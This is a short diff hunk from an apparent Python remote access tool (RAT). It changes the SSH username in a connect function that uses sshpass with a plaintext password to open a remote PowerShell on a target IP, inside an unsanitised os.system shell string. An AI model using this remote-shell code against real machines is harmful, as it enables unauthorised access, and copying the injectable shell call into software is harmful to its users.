@@ -74,7 +74,7 @@ def os_detection():
 # connects RAT to target
 def connect(ipv4, password):
     # remotely connect
-    os.system(f"sshpass -p \"{password}\" ssh user@{ipv4} 'powershell'")
+    os.system(f"sshpass -p \"{password}\" ssh petrosrat@{ipv4} 'powershell'")
 
 
 # terminates the programm
